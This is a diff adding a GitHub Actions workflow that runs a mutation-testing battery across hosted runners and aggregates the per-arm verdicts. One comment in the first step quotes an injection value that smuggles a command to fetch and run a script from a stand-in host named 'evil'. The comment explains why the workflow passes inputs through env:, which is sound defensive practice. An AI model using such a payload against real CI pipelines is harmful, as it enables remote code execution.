@@ -1,0 +1,372 @@
+# Run a deletion-mutant battery as a hosted matrix, one runner per arm.
+#
+# WHY THIS EXISTS. A battery is embarrassingly parallel -- every arm is an
+# independent checkout, mutation and test run -- but on a single shared host it
+# is bounded by that host's cores, and a busy box turns a twenty-minute
+# measurement into a three-hour one or a load incident. Hosted runners are the
+# right venue for pure test fan-out: fifty arms cost fifty runners for one arm's
+# wall time each, and they take nothing from the shared host.
+#
+# ONE AUTHORITY FOR THE RULES. Every classification decision here is made by
+# scripts/battery/*, the same files the host-side harness calls. The workflow
+# owns orchestration -- checkout, matrix, artifacts -- and owns none of the
+# semantics. A second copy of "what counts as a kill" is how two venues end up
+# reporting different numbers for the same table and nobody can say which is
+# right.
+#
+# WHAT A GREEN RUN MEANS: the _BASELINE arm was green on the pristine tree, the
+# _SENTINEL arm stayed green with an inert edit applied, every mutant in the
+# table reported a verdict, none of them survived unexpectedly, and no arm hit a
+# harness error. Anything less fails the workflow.
+#
+# Hosted runners only. SELF_HOSTED_RUNNERS is disabled fleet-wide and the ARC
+# pool is gone, so there is no runner-label pair here to keep in sync.
+name: Mutation battery
+
+on:
+  workflow_dispatch:
+    inputs:
+      tip:
+        description: 'Full 40-hex commit sha to measure. Not a branch name: a battery is a statement about one tree, and a branch that moves mid-run makes the arms incomparable.'
+        required: true
+        type: string
+      packages:
+        description: 'Space-separated go package patterns, run WHOLE (no -run selector is ever derived). e.g. "./internal/contextfabric/ ./internal/contracts/v1/"'
+        required: true
+        type: string
+      table_path:
+        description: 'Path IN THE REPO at <tip> to the mutant table (TSV or JSONL). Leave blank if using table_b64.'
+        required: false
+        type: string
+        default: ''
+      table_b64:
+        description: 'base64 of the mutant table, for a table that is not committed. Exactly one of table_path/table_b64.'
+        required: false
+        type: string
+        default: ''
+      expected_survivors:
+        description: 'Space-separated mutant IDS allowed to survive. Empty means NONE, not "unchecked".'
+        required: false
+        type: string
+        default: ''
+      go_test_timeout:
+        description: 'Explicit -timeout for every go test invocation. A whole-package acr suite has been measured at 559-600s against go''s 600s default.'
+        required: false
+        type: string
+        default: '20m'
+
+permissions:
+  contents: read
+
+concurrency:
+  # One battery per tip at a time. Two dispatches of the same tree would
+  # produce two artifact sets that are indistinguishable in the aggregate.
+  group: mutation-battery-${{ inputs.tip }}
+  cancel-in-progress: false
+
+env:
+  GO_VERSION: '1.27.0'
+
+jobs:
+  plan:
+    name: plan
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.plan.outputs.matrix }}
+      arm_count: ${{ steps.plan.outputs.arm_count }}
+      matrix_size: ${{ steps.plan.outputs.matrix_size }}
+      sentinel_file: ${{ steps.plan.outputs.sentinel_file }}
+      floor: ${{ steps.floor.outputs.floor }}
+    steps:
+      # actions/checkout v7.0.0
+      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+        with:
+          ref: ${{ inputs.tip }}
+          persist-credentials: false
+
+      - name: Assert the tip is a full sha and is what we checked out
+        # EVERY workflow_dispatch input reaches the shell through env:, never
+        # through ${{ }} interpolation. A dispatch input is attacker-controlled
+        # text; interpolated into a run: block it is executed, and a table path
+        # of `x"; curl evil | sh; #` would run. Through env: it is only ever
+        # data. Same rule in every run: step below.
+        env:
+          TIP: ${{ inputs.tip }}
+        run: |
+          set -euo pipefail
+          tip="$TIP"
+          case "$tip" in
+            [0-9a-f]*) ;;
+            *) echo "tip [$tip] is not lowercase hex -- pass a full 40-hex sha, not a branch"; exit 1 ;;
+          esac
+          [ "${#tip}" -eq 40 ] || { echo "tip [$tip] is ${#tip} chars, want 40"; exit 1; }
+          head=$(git rev-parse HEAD)
+          [ "$head" = "$tip" ] || { echo "checked out $head, asked for $tip"; exit 1; }
+          echo "ok tip: $head"
+
+      - name: Resolve the mutant table
+        env:
+          TABLE_PATH: ${{ inputs.table_path }}
+          TABLE_B64: ${{ inputs.table_b64 }}
+        run: |
+          set -euo pipefail
+          p="$TABLE_PATH"
+          b="$TABLE_B64"
+          if [ -n "$p" ] && [ -n "$b" ]; then
+            echo "give exactly one of table_path / table_b64, not both"; exit 1
+          fi
+          if [ -z "$p" ] && [ -z "$b" ]; then
+            echo "give exactly one of table_path / table_b64"; exit 1
+          fi
+          if [ -n "$p" ]; then
+            [ -f "$p" ] || { echo "table_path [$p] does not exist at this tip"; exit 1; }
+            cp "$p" table.raw
+          else
+            printf '%s' "$b" | base64 -d > table.raw
+          fi
+          echo "table sha256: $(sha256sum table.raw | cut -d' ' -f1)"
+          wc -c table.raw
+
+      - name: Normalise and validate the table
+        run: python3 scripts/battery/normalize_table.py table.raw --out table.jsonl
+
+      - name: Pre-flight every needle against this tree
+        # EARLY, before a single runner is spent on a suite: a stale table is
+        # cheap to detect here and expensive to discover across fifty jobs.
+        run: python3 scripts/battery/preflight.py --root . --table table.jsonl
+
+      # actions/setup-go v6.5.0
+      - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+
+      - name: Derive the func Test floor, with its negative control
+        id: floor
+        env:
+          PACKAGES: ${{ inputs.packages }}
+        run: |
+          set -euo pipefail
+          # $PACKAGES is intentionally unquoted: it is a package LIST and must
+          # word-split. Coming from env: it cannot carry command substitution,
+          # only words -- and a bad word fails `go list` loudly rather than
+          # executing.
+          # shellcheck disable=SC2086
+          bash scripts/battery/floor.sh . $PACKAGES | tee floor.tsv
+          total=$(awk -F'\t' '$1=="TOTAL"{print $2}' floor.tsv)
+          case "$total" in ''|*[!0-9]*) echo "floor unparseable [$total]"; exit 1 ;; esac
+          echo "floor=$total" >> "$GITHUB_OUTPUT"
+
+      - name: Build the matrix
+        id: plan
+        run: |
+          set -euo pipefail
+          python3 scripts/battery/plan_matrix.py --table table.jsonl > matrix.json 2> plan.err
+          cat plan.err
+          echo "matrix=$(cat matrix.json)" >> "$GITHUB_OUTPUT"
+          grep -E '^(arm_count|matrix_size|sentinel_file)=' plan.err >> "$GITHUB_OUTPUT"
+
+      - name: Publish the plan to the job summary
+        env:
+          TIP: ${{ inputs.tip }}
+          PACKAGES: ${{ inputs.packages }}
+          ARM_COUNT: ${{ steps.plan.outputs.arm_count }}
+          MATRIX_SIZE: ${{ steps.plan.outputs.matrix_size }}
+          FLOOR: ${{ steps.floor.outputs.floor }}
+          GO_TEST_TIMEOUT: ${{ inputs.go_test_timeout }}
+          EXPECTED_SURVIVORS: ${{ inputs.expected_survivors }}
+        run: |
+          {
+            echo "### Battery plan"
+            echo
+            echo "| field | value |"
+            echo "|---|---|"
+            echo "| tip | \`$TIP\` |"
+            echo "| packages | \`$PACKAGES\` |"
+            echo "| arms | $ARM_COUNT |"
+            echo "| matrix jobs (arms + baseline + sentinel) | $MATRIX_SIZE |"
+            echo "| floor (SUM over the package list) | $FLOOR |"
+            echo "| go test timeout | \`$GO_TEST_TIMEOUT\` |"
+            echo "| expected survivors | \`$EXPECTED_SURVIVORS\` |"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # The normalised table travels to every arm and to the aggregate, so all
+      # three stages read byte-identical input rather than each re-parsing the
+      # raw table and possibly disagreeing.
+      # actions/upload-artifact v5.0.0
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        with:
+          name: battery-table
+          path: table.jsonl
+          retention-days: 7
+
+  arm:
+    name: arm ${{ matrix.id }}
+    needs: plan
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false   # one arm's verdict never cancels another's; the
+                         # aggregate is the verdict, and a partial matrix is a
+                         # harness error rather than a smaller battery.
+      max-parallel: 50
+      matrix: ${{ fromJson(needs.plan.outputs.matrix) }}
+    steps:
+      # actions/checkout v7.0.0
+      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+        with:
+          ref: ${{ inputs.tip }}
+          persist-credentials: false
+
+      # actions/setup-go v6.5.0
+      - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+
+      # actions/download-artifact v6.0.0
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c
+        with:
+          name: battery-table
+          path: .battery
+
+      - name: Extract this arm's spec
+        env:
+          ARM_ID: ${{ matrix.id }}
+        run: |
+          set -euo pipefail
+          mkdir -p .battery/out
+          if [ "$ARM_ID" = "_BASELINE" ] || [ "$ARM_ID" = "_SENTINEL" ]; then
+            echo "harness arm, no spec"
+            exit 0
+          fi
+          python3 - "$ARM_ID" .battery/table.jsonl .battery/spec.json <<'PY'
+          import io, json, sys
+          want, table, out = sys.argv[1], sys.argv[2], sys.argv[3]
+          for line in io.open(table, encoding="utf-8"):
+              if not line.strip():
+                  continue
+              m = json.loads(line)
+              if m["id"] == want:
+                  io.open(out, "w", encoding="utf-8").write(json.dumps(m))
+                  raise SystemExit(0)
+          print("no such mutant id in the table: %s" % want, file=sys.stderr)
+          raise SystemExit(1)
+          PY
+
+      - name: Run the arm
+        env:
+          MB_GO_TEST_TIMEOUT: ${{ inputs.go_test_timeout }}
+          MB_SENTINEL_FILE: ${{ needs.plan.outputs.sentinel_file }}
+          MB_ARM_LOG: .battery/out/arm.log
+          ARM_ID: ${{ matrix.id }}
+          PACKAGES: ${{ inputs.packages }}
+          FLOOR: ${{ needs.plan.outputs.floor }}
+        # This step must SUCCEED even when the arm's verdict is bad: the verdict
+        # travels as an artifact and the aggregate decides. A failing step here
+        # would lose the artifact and turn a real SURVIVED into a missing arm.
+        run: |
+          bash scripts/battery/run_arm.sh \
+            "$PWD" "$ARM_ID" ".battery/spec.json" \
+            "$PACKAGES" "$FLOOR" \
+            ".battery/out/$ARM_ID.json"
+
+      - name: Show this arm's verdict
+        env:
+          ARM_ID: ${{ matrix.id }}
+        run: cat ".battery/out/$ARM_ID.json"
+
+      # actions/upload-artifact v5.0.0
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        if: always()
+        with:
+          name: battery-arm-${{ matrix.id }}
+          path: |
+            .battery/out/${{ matrix.id }}.json
+            .battery/out/arm.log
+          retention-days: 7
+
+  aggregate:
+    name: aggregate
+    needs: [plan, arm]
+    # `always()` so a matrix job that died still reaches the aggregate, which
+    # reports it as a missing arm -- a HARNESS_ERROR -- instead of the run
+    # simply skipping the verdict and looking inconclusive.
+    if: always()
+    runs-on: ubuntu-latest
+    steps:
+      # actions/checkout v7.0.0
+      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+        with:
+          ref: ${{ inputs.tip }}
+          persist-credentials: false
+
+      # actions/download-artifact v6.0.0
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c
+        with:
+          pattern: battery-arm-*
+          path: .battery/arms
+
+      # actions/download-artifact v6.0.0
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c
+        with:
+          name: battery-table
+          path: .battery
+
+      - name: Merge the arms into the one verdict
+        id: merge
+        env:
+          EXPECTED_SURVIVORS: ${{ inputs.expected_survivors }}
+          PACKAGES: ${{ inputs.packages }}
+          TIP: ${{ inputs.tip }}
+          FLOOR: ${{ needs.plan.outputs.floor }}
+        run: |
+          set -uo pipefail
+          python3 scripts/battery/aggregate.py \
+            --table .battery/table.jsonl \
+            --arms-dir .battery/arms \
+            --expected-survivors "$EXPECTED_SURVIVORS" \
+            --execution-shape hosted \
+            --packages "$PACKAGES" \
+            --tip "$TIP" \
+            --floor "$FLOOR" \
+            --summary-out summary.txt
+          echo "rc=$?" >> "$GITHUB_OUTPUT"
+
+      - name: Publish the summary
+        if: always()
+        run: |
+          {
+            echo "### Battery result"
+            echo
+            echo '```'
+            cat summary.txt 2>/dev/null || echo "no summary was produced"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # actions/upload-artifact v5.0.0
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        if: always()
+        with:
+          name: battery-summary
+          path: summary.txt
+          retention-days: 30
+
+      - name: Fail the workflow on the aggregate's verdict
+        # The single verdict. Re-run rather than reading it off the step above,
+        # so the workflow's own conclusion comes from the aggregate's rc and not
+        # from a captured string that could go stale.
+        env:
+          EXPECTED_SURVIVORS: ${{ inputs.expected_survivors }}
+          PACKAGES: ${{ inputs.packages }}
+          TIP: ${{ inputs.tip }}
+          FLOOR: ${{ needs.plan.outputs.floor }}
+        run: |
+          python3 scripts/battery/aggregate.py \
+            --table .battery/table.jsonl \
+            --arms-dir .battery/arms \
+            --expected-survivors "$EXPECTED_SURVIVORS" \
+            --execution-shape hosted \
+            --packages "$PACKAGES" \
+            --tip "$TIP" \
+            --floor "$FLOOR" \
+            --summary-out /dev/null > /dev/null
